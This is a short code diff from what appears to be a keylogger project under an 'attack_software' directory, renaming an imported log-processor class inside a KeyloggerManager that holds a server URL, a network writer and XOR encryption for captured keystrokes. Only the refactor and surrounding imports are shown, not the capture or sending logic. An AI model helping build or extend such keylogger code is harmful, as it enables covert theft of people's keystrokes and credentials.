@@ -1,6 +1,6 @@
 import time
 from NetworkWriter import WriterNetwork
-from keyboard_log_processor import keyboard_log_processor
+from keyboard_log_processor import KeyboardLogProcessor
 from attack_software.config.config import Flush_interval
 from attack_software.src.xor_encryption import XOREncryption
 from keylogger_service import KeyloggerService
@@ -16,7 +16,7 @@ class KeyloggerManager:
         self.server_url = server_url
         self.last_buffer_send = time.time()
         self.writerNetwork = WriterNetwork()
-        self.dictWriter = keyboard_log_processor()
+        self.dictWriter = KeyboardLogProcessor()
         self.encryption = XOREncryption()
 
     def buffer_monitor(self):
